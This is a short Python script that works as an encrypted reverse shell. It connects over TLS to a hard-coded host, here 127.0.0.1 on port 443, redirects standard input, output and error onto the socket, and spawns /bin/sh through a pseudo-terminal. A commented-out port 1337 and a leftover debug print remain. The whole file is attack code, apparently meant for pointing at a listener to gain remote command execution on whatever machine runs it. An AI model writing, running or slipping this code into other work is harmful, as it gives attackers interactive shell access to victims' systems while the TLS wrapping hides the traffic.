import socket
import subprocess
import os
import pty
import ssl

hostname = '127.0.0.1'
# port = 1337

context = ssl.create_default_context()
context.load_default_certs()
with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
    sock.connect((hostname, 443))
    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
        ssock.do_handshake()
        print(ssock.version())

        os.dup2(ssock.fileno(),0)
        os.dup2(ssock.fileno(),1)
        os.dup2(ssock.fileno(),2)
        pty.spawn("/bin/sh")

print("EEE")
